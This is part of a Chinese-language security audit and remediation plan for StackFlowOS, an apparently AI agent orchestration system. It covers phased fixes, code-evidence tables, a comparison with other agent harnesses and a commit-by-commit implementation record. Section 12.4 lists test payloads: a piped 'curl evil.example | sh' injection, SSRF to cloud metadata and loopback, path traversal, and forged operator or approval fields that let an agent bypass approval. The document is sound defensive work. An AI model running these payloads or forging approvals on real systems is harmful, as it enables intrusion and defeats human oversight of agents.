| Phase 1 | Web 认证/CSRF/头/SSE/控制面/X1 | `feat(web): token cookie admission`；`feat(web): security headers and sse auth`；`feat(cli): local control socket` | §5.1.11 全过 | 4–6 天 |
| Phase 2 | RPC v2 身份/白名单/范围/事件/审批/删除 | `feat(protocol): authenticated rpc envelope`；`feat(security): hub-side action allowlist`；`refactor(events): retire unauthenticated publish` | §5.2.11 全过 | 5–8 天 |
| Phase 3 | shell 加固/策略匹配/SSRF/路径/once | `fix(tools): process-group timeout and bounded output`；`fix(security): boundary-safe matchers and ssrf` | §5.3/5.4 验收全过 | 3–5 天 |
| Phase 4 | 健壮性（store/deps/supervisor/memory/console/policy/failure/disposer/测试） | `fix(robustness): ...`（可拆多个提交） | §6 测试全过 | 4–6 天 |
| Phase 5 | OS 沙箱/远程/体验/文档 | `feat(sandbox): landlock worker confinement`；`docs: threat model and remote mode` | 沙箱不可用拒绝执行；远程需要 TLS | 5–8 天 |

> 每个阶段结束跑全量测试 + 手工验证（真实 hub、浏览器、SSE、审批、shell）。不要把多个阶段混在一个提交里；本项目 AGENTS.md 要求“每个工作阶段要有 commit”。

### 9.2 迁移与兼容

| 变更 | 兼容策略 |
|---|---|
| Web 认证 | 旧书签不带 token → 401 页面提示“请用 `sfo url` 获取启动链接”；`sfo url` 打印；不提供 `--no-auth` 生产开关。 |
| 协议 v2 | hub/worker 同版本部署；v1 外部客户端 → 401 + 明确“升级到 v2”；`attach` 设备需重新配对。 |
| 规则语义 | `path_glob`/`url_prefix`/`command_regex` 收紧；加载时标记 legacy unsafe 的 shell 规则并禁用；UI 提示重写；提供迁移脚本（可选）。 |
| 审批模式 | 弹窗默认 once；`always` 从弹窗移除；旧 always 规则保留但按新 matcher 评估；设置页可删/改。 |
| 数据 | `memory.json` 迁移到 `state/memory/`；损坏文件隔离；`rules.json`/`approvals.json` 无效条目跳过并告警。 |
| CLI | `sfo status` 走 control socket；`--token` 显式覆盖；`sfo hub --host 0.0.0.0` → 报错，需 `--allow-remote`。 |

### 9.3 回滚

- 每个阶段独立提交；Web 认证如出问题，回滚 Phase 1 提交即可恢复旧行为（但不建议部署未修版本）。
- 协议 v2 回滚需同时回滚 hub/worker；保留 v1 解码器一个版本，但默认拒绝（可临时通过配置 `protocol.allow_v1=true` 仅用于回滚，默认 false）。
- 规则迁移前备份 `state/rules.json`；提供 `sfo rules export/import`（可选）。

### 9.4 时间受限的最小修复（如果只能做 10–12 天）

优先级：**H1 + H2 + H3（至少 operator-only 白名单 + `src` 不授权）+ H4 + M1–M4 + M6 + M9 + X2**。

- H1/H2：Web 认证与 SSE；
- H3：动作白名单 + 资源范围 + unit token（没有 token 就无法可靠识别 worker，只能拒绝所有外部高危动作）；
- H4：进程组 kill + 有界输出（最容易被利用的 DoS）；
- M1–M4：匹配与 SSRF；
- M6/M9：删除确认与 project_id 校验；
- X2：停用外部事件 PUB。

这样能关闭所有“未授权控制/越权/主机级”路径；M7/M8/L*/S* 可以排后。

---

## 10. 文件改动清单

| 文件 | 改动 | 阶段 |
|---|---|---|
| `web/auth.py`（新增） | token/cookie/authority/admission | 1 |
| `web/server.py` | admission、安全头、SSE、请求限额、control socket | 1/4 |
| `web/api.py` | auth context、输入校验、通用 500 | 1/4 |
| `webassets/js/api.js`、`store.js`、`apps.js` | CSRF 头、401 处理、审批详情 | 1/4 |
| `protocol.py` | `auth`、v2 | 2 |
| `transport/nng.py` | auth 透传、错误映射、PUB 退役 | 2 |
| `app.py` | ActionRule、principal、scope、event、approval、project_card、memory、console | 2/4 |
| `units/worker.py` | token 读取、event.append | 2 |
| `agents/supervisor.py` | token 下发/回收、kill 升级 | 2/4 |
| `security/approvals.py` | principal/owner/claim/once | 2/4 |
| `security/policy.py` | matcher、risk、规则健壮性 | 3/4 |
| `security/capabilities.py` | private host → high；chain 风险 | 3 |
| `agents/tools.py` | shell、SSRF、preview/redact、project.delete、env | 3/4 |
| `projects/store.py` | copy-on-write、deps | 4 |
| `kernel/context.py` | disposer 竞态 | 4 |
| `l2/eventlog.py` | 订阅锁、query | 4 |
| `l2/failure.py` | history 上限 | 4 |
| `config.py` | web/security/transport 配置与校验 | 1/3/5 |
| `cli.py` | control socket、url/status、wildcard 拒绝 | 1/4 |
| `docs/architecture.md`、`README.md`、`docs/operations.md` | 威胁模型、协议 v2、认证、已知限制 | 1–5 |
| `tests/*` | 见 §8 | 0–4 |

---

## 11. 风险与开放问题（需要拍板）

1. **是否移除弹窗里的“总是允许”？**
   - 推荐移除/降级为“本会话”，永久规则只在设置页创建。影响 UX，但能消除一大类规则匹配绕过。需产品确认。
2. **协议 v2 是否接受外部 v1 worker 失效？**
   - 推荐接受；否则 v1 无法认证。给一个版本窗口的明确报错。
3. **CLI 控制面是否接受 Linux-only 的 `SO_PEERCRED`/`/proc`？**
   - Linux 上体验最好；非 Linux 退化为 `sfo url --print`（用户手动），文档写明。需确认目标平台。
4. **是否在 Phase 1 就拒绝 `0.0.0.0`？**
   - 推荐是。远程用户会被迫显式 `allow_remote` + TLS/反代；这是有意的摩擦。
5. **审批预览存多长？**
   - 推荐 64KB/条，事件日志只存截断+哈希；否则审批存储/事件流会被大文件内容撑爆。
6. **worker 事件从 PUB 改 RPC 的吞吐/延迟是否可接受？**
   - 当前 worker 事件量低（tool/agent step），可接受；若未来流式输出，用 hub 内部流，不开放外部 PUB。
7. **是否引入 OS 沙箱依赖（Landlock/bwrap）？**
   - Phase 5；如果目标环境不支持，必须“拒绝执行”而不是降级（DSH 的原则）。需确认部署环境。
8. **同用户残余风险是否接受？**
   - 应用层无法完全解决；接受并在 README 写明，Phase 5 用独立用户/沙箱解决。若用户要求“agent 绝对不能自审批”，则必须提前做独立用户/沙箱。

---

## 12. 附录

### 12.1 审查项 → 代码证据（b5efb32）

| 审查项 | 代码事实 | 复核 |
|---|---|---|
| Web 无认证 | `web/server.py:8-10` 自述“no authentication”；`_read_request` 不校验 Host/Origin/CT | ✅ 读代码 |
| CSRF 可打审批 | `web/api.py:236-249` `approval_decide` 无来源校验；`_decode_body` 不看 CT | ✅ |
| DNS rebinding | 无 Host 校验；静态/API 都接受任意 Host | ✅ |
| 点击劫持 | `_serve_static` 无 XFO/CSP；`_send_json` 无安全头 | ✅ |
| SSE CORS | `web/server.py:232` `Access-Control-Allow-Origin: *` | ✅ |
| RPC src 自报 | `Envelope.src` 来自 wire；`handle_rpc_action` 用它做特权判断 | ✅ |
| 特权集合不全 | `app.py:37-38` 仅 5 个；`project.delete`/`agent.kill`/`unit.kill`/`project.update`/`event.append`/`approval.use` 不在 | ✅ |
| `_bind_principal` 可冒用 | `app.py:457` 用 `_agent_for_unit(src)`，src 可伪造 | ✅ |
| lease/unit.release holder 取自 body | `app.py:684-717`、`620-633` | ✅ |
| event.append 伪造 | `app.py:1006-1016` type/source/project 全部来自 data | ✅ |
| shell 超时挂死 | `agents/tools.py:768-800` `proc.kill()` + 无超时 `communicate()` | ✅ |
| 输出无界 | `communicate()` 全量读；cap 在读后 | ✅ |
| url_prefix | `security/policy.py:234` `startswith` | ✅ |
| path_glob | `policy.py:211-217` 同时匹配 raw；fnmatch | ✅ |
| command_regex | `policy.py:218-226` `re.search` | ✅ |
| net.fetch 私网 | `capabilities.py:171-172` `_max_risk(level,"medium")` 空操作 | ✅ |
| 重定向 | `tools.py:855-875` 只检查最终 scheme | ✅ |
| 跨项目 | `app.py` task/agent/event handler 无 project 校验 | ✅ |
| project.delete confirm | `tools.py:944-960` 自动填 | ✅ |
| preview 截断 | `tools.py:245` `max_preview=4000`；`app.py:730` 再截 | ✅ |
| _redact | `tools.py:45-47` 只遮 `Authorization` 后的第一个 token（`Bearer`） | ✅ |
| risk 路径拼接 | `policy.py:269-276`、`approvals.py:484-491` | ✅ |
| once 竞态 | PR #2 已加 request 时消费；`evaluate+consume` 仍两次锁 | ✅（部分缓解） |
| Web 校验 | `api.py:53` `str(exc)`；`229/233` `int()` 未捕获；`server.py:155` 负 CL；`249` heartbeat | ✅ |
| project_card 子串 | `app.py:1501` `card["id"] in json.dumps(resource)` | ✅ |
| policy 损坏 | `policy.py:74-81` `int()`；`309-329` 只捕 `TypeError/ValueError` 于 from_dict | ✅ |
| shell 日志 | `tools.py:822-836` 毫秒名；stdout 原样 | ✅ |
| timeout 上限 | `tools.py:195-199` 无 finiteness/上限 | ✅ |
| MemoryStore | `app.py:46-63` 全量写；无大小；损坏抛错 | ✅ |
| console | `app.py:1575-1584` `tail(limit*4)` 后过滤 | ✅ |
| tcp wildcard | `config.py:46-64` 无 host 校验 | ✅ |
| store 先改后验 | `projects/store.py:315-360`、`524-633` | ✅ |
| deps | `store.py:406-450` 无校验 | ✅ |
| supervisor terminate | `supervisor.py:531-541` 只 terminate | ✅ |
| coder 失败继续 | `brain.py:299-316` `_compiled=True` 先于 shell | ✅ |
| reviewer 读失败仍通过 | `brain.py:354-407` 仅无 artifact 才 missing | ✅ |
| disposer 竞态 | `kernel/context.py:223-278` 晚到 append | ✅ |
| eventlog 订阅锁 | `l2/eventlog.py:153-186` 无锁 | ✅ |
| failure history | `l2/failure.py:76,206,244-249` | ✅ |

### 12.2 DSH 证据（节选）

| 机制 | 证据 |
|---|---|
| 默认 loopback + 拒绝 wildcard | `packages/bundle/web-app/cordis.patch.yml:187-188`；`packages/host/webserver/src/index.ts:433-441`；`packages/bundle/web-app/src/startup.ts:95-97` |
| launch token 32B + `?token=` | `packages/host/authentication-token/src/browser-auth.ts:62-68,245-248` |
| HMAC Cookie HttpOnly/SameSite=Strict/authority | `browser-auth.ts:117-141,264-290` |
| Host/Origin/Sec-Fetch | `packages/client/connection/src/api-request-trust.ts:127-176` |
| 非 simple Content-Type | `packages/client/connection/src/rpc-host.ts:249-252` |
| 无 CORS | 生产代码 grep 无 `Access-Control-Allow-Origin` |
| 安全头缺口 | `packages/host/frontend-static/src/index.ts:107-113` 仅 content-type |
| WS 认证 + 心跳 | `packages/api/gateway/src/index.ts:270-278`；`stream-server.ts:94-150` |
| 权限三档 | `packages/sandbox/sandbox/src/index.ts:38`；`sandbox-policy/src/index.ts:138` |
| OS 沙箱后端 | `packages/sandbox/sandbox-local/src/index.ts:178-181,547-552` |
| 只有 allowed-once | `packages/interaction/user-approval/src/index.ts:57,239` |
| 审批审计 asked/decided | `user-approval/src/index.ts:253-260` |
| bash 超时/进程组/输出 | `packages/shell/bash-local/src/index.ts:102-106,365-376`；`subprocess-local/src/spawn.ts:112-125`；`output.ts:43,206` |
| 无 SSRF 过滤（缺口） | `packages/web/web-fetch-http/src/provider.ts:38` |
| RPC 身份服务端绑定 | `packages/api/gateway/src/types.ts:27-29`；`gateway/src/index.ts:774-789` |
| 事件 source 由代码构造 | `packages/core/session/src/index.ts:338-383` |

### 12.3 Pi 证据（节选）

> 来源：AppImage 解包后的 `app.asar`/`agent-host.mjs`/`pi-coding-agent` bundle，以及官方文档（`github.com/DLYZZT/pi-desktop`、`pi-desktop.app`、`docs.pi.dev`）。仓库是开源的，但本机未克隆源码；表内机制以“文档 + 逆向”为准，实施前建议对照上游源码复核。

| 机制 | 证据 |
|---|---|
| 产品身份 | 解包 `resources/app.asar`：`@dlyzzt/pi-desktop` 0.4.2，Apache-2.0，`github.com/DLYZZT/pi-desktop`；内置 `@earendil-works/pi-coding-agent` 1.2.0 |
| 不逐条审批 | 官方文档 + 二进制：bash/edit/write 无确认调用 |
| 三层工具策略 | requested/execution/mcpExecution + `tool_call` 钩子 |
| 首次 MCP 确认 | 原生框、120s 超时、并发合并、按会话粘性 |
| 敏感动作二次确认 | buy/pay/submit/delete/authorize 等；默认 Deny、cancelId=0 |
| 零端口 UI/控制面 | MessagePort + 类型化 RPC；无 `createServer`（除 MCP OAuth 回调） |
| IPC 信任 | `isTrustedDesktopIpcSender`（sender 主窗口/主 frame）+ preload 白名单 |
| 授权即租约 | `sessionId+permission+policyRevision+expiresAt`，副作用前校验 |
| 进程树 kill | `killProcessTree`：SIGKILL 进程组 / `taskkill /F /T` |
| 输出上限 | 2000 行/50KB |
| 网络私网 | `allowPrivateNetwork=false`；strict 无沙箱拒绝 |
| 文件边界 | `assertPathAllowed`（只保护文件 API，不约束 bash） |
| 脱敏 | Authorization 整行、`*_TOKEN/*_PROXY`、token/password/secret/api_key、`gh*_`/`npm_`、URL userinfo |
| env 缺口 | shell 继承完整 `process.env`，provider key 对 Agent 命令可见 |

### 12.4 攻击载荷速查（用于测试）

```text
Host: evil.example
Origin: https://evil.example
Sec-Fetch-Site: cross-site
Content-Type: text/plain
Content-Length: -5
X-SFO-Request: (missing)

https://api.example.com.evil.io/x
/ws/proj/../../etc/passwd
echo hi; curl https://evil.example/p | sh
http://127.0.0.1:17800/api/state
http://169.254.169.254/latest/meta-data/
http://[::1]:17800/api/approvals
project_id=../../..
task_id=t-other-project
agent_id=agent-other-project
src=operator
type=approval.decided
source=operator
grant_id=another-agent-grant
timeout_s=Infinity
heartbeat=0
path=/tmp/%00/etc/passwd
Authorization: Bearer eyJhbGciOi...
https://user:pass@example.com/
```

### 12.5 术语

| 术语 | 含义 |
|---|---|
| principal | 发起动作的身份：`sys` / `operator` / `unit:<work_id>`（含 role/project） |
| admission | 路由前的统一请求准入（Host/Origin/CT/CSRF/认证） |
| claim | 一次性授权凭证；消费后失效 |
| scope fingerprint | capability + 规范化 scope 的哈希，用于绑定 claim/grant |
| legacy_unsafe | 旧规则中不可安全评估的 `command_regex`（未锚定等） |
| spill | 完整 shell 输出的落盘文件 |
| fail closed | 无法证明授权时拒绝 |

---

## 13. 参考链接

- Pi Agent Desktop：<https://github.com/DLYZZT/pi-desktop>、<https://pi-desktop.app/>、<https://docs.pi.dev/latest/security>
- DeepSeek Harness 本机 checkout：`/home/nihao/tool/deepseek-harness`（Web 认证 `packages/host/authentication-token`；admission `packages/client/connection/src/api-request-trust.ts`；沙箱 `packages/sandbox`；bash `packages/shell/bash-local`；审批 `packages/interaction/user-approval`）
- StackFlowOS 架构契约：`docs/architecture.md` §6（权限/审批）、§9（Web）、§14（已知偏差）
- 审查基线：`origin/main` `b5efb32`；复现：`/tmp/sfo-origin` 261 tests

---

> 方案已按 §14 实施：合并 `origin/main` 后，逐条目一个子 agent 修复并提交；最终全量 `676 tests OK`。§14 是实际提交与残余风险清单。

---

## 14. 实施记录（2026-11-23）

**基线处理**：`origin/main`（b5efb32）已合入产品 `main`，合并提交 `7169929`。合并时保留了本地 `operator/attach/units/chat-context` 功能，移植了 PR #1/#2 的 `external` RPC guard、`_bind_principal`、once 预消费、runner loop guard、LLM history/wait 工具、`socket_dir_for`。冲突解决后 `297 tests OK`；随后逐条目修复。

**最终验证**：

```
python3 -m unittest discover -s tests -q
Ran 676 tests in 57.647s
OK
python3 -m compileall -q stackflowos tests  # OK
node --check stackflowos/webassets/js/apps.js # OK
node --check stackflowos/webassets/js/api.js  # OK
git diff --check                             # OK
```

| 条目 | 提交 | 状态 |
|---|---|---|
| H1 Web 认证/admission/安全头 | `ae5116e` | ✅ |
| H2 SSE CORS/限额 | `2ad15c4` | ✅ |
| H3 RPC v2 身份/principal/特权 | `8e52eb8` | ✅ |
| H4 shell 进程组/有界输出 | `9c9c5ac` | ✅ |
| M1 url_prefix 边界 | `f4cfcf8` | ✅ |
| M2 path_glob 规范化 | `785d6a4` | ✅ |
| M3 command_regex fullmatch/链式 | `c5aca90` | ✅ |
| M4 net.fetch SSRF/重定向 | `a95dc59` | ✅ |
| M5 跨项目范围 | `cd00989` | ✅ |
| M6 project.delete confirm | `b8839e9` | ✅ |
| M7 完整预览/哈希 | `039a4b4` | ✅ |
| M8 统一脱敏 | `95b5b08` | ✅ |
| M9 project_id 路径 | `dbe4703` | ✅ |
| M10 once 原子 claim | `863849d` | ✅ |
| L1 Web 输入校验/限额 | `ed1d62f` | ✅ |
| L2 租约精确归属 | `ee6eebe` | ✅ |
| L3 规则数据容错 | `d01a37e` | ✅ |
| L4 shell 日志安全 | `3892091` | ✅ |
| L5 timeout 上限/NaN | `bad241e` | ✅ |
| L6 MemoryStore 分项目/上限 | `f3a5475` | ✅ |
| L7 console 查询 | `2e72488` | ✅ |
| L8 wildcard bind 拒绝 | `b509c34` | ✅ |
| L9 测试临时目录 | `7b1d138` | ✅ |
| S1 store copy-on-write | `a03b10f` | ✅ |
| S2 task deps 校验 | `283aa4a` | ✅ |
| S3 supervisor 终止升级 | `53cb99f` | ✅ |
| S4 coder 自检失败终止 | `c6e1a78` | ✅ |
| S5 reviewer 读失败打回 | `479c68d` | ✅ |
| S6 disposer 竞态 | `df67c8d` | ✅ |
| S7 eventlog 订阅锁 | `9828c46` | ✅ |
| S8 failure history 上限 | `d525209` | ✅ |
| X1 operator 二次确认/审计 | `740c7e2` | ✅ |
| X2 事件 PUB/白名单 | `4af3161` | ✅ |

**实施中发现的额外问题 / 未完成项**：

1. **reviewer 角色的 `fs.write`**：`reviewer` 工具表没有 `fs.write`，所以 `_reviewer` 写 `review/<id>-review.md` 会被 runner 的角色工具检查拒绝（S5 未扩大权限）。这是既有功能缺陷，不在原审查清单；建议单独补 `fs.write` 或改为 `task.artifact` 记录评审。
2. **lease 资源范围**：H3/M5 绑定了 lease holder，但 `lease.acquire` 的 `resource` 仍可填 `project:<别人的项目>:...`；建议后续把 unit 的 lease resource 限制为 own project/task。
3. **operator 审计 result/error**：M8 只统一了 args/preview 脱敏；`operator._audit` 的 result/error 尚未 redact（M8 报告中已注明）。
4. **H1 的 launch token**：当前进程生命周期内可重复兑换；方案原意是 `sfo url` 每次新签发、兑换即失效；control socket/`sfo url` 尚未实现，systemd 场景仍需显式 `SFO_WEB_TOKEN`。
5. **Phase 5**：OS 沙箱（Landlock/bwrap）、独立 worker 用户、TLS/远程模式、TLS 配置接线未做；当前远程部署仍需 SSH 隧道/反代。
6. **同用户残余风险**：RPC/Web 认证只防“通过 API 的越权”；同用户进程仍可直读/写 `.stackflowos`、向 hub 发信号；README/威胁模型需继续保持这一说明。
7. **测试临时目录**：L9 只迁移了 `test_address`/`test_transport`；其余大量测试仍使用 `<repo>/.stackflowos/tmp` 的非 socket 状态（socket 已由 `socket_dir_for` 迁移），长路径 CI 仍建议统一迁移。
8. **M4 DNS rebinding**：`getaddrinfo` 校验与 urllib 连接之间仍有 TOCTOU；未做 IP 固定连接。
